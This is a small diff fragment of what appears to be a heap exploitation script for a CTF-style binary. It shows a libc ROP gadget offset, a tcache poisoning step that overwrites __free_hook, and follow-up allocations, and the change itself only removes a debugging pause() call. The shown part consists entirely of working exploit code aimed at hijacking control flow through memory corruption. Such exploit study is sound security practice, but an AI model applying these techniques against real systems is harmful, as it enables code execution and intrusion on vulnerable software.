@@ -432,7 +432,6 @@ xchg_eax_edi = libc_base + 0xf1b95  # xchg eax, edi; ret;
 # Write __free_hook in tcachebins 
 Free()
 Alloc(0xe0, b"A"*0x78+p64(0x81)+p64(free_hook-0x10))
-pause()
 
 for i in range(5):
   Alloc(0x70, "\n")
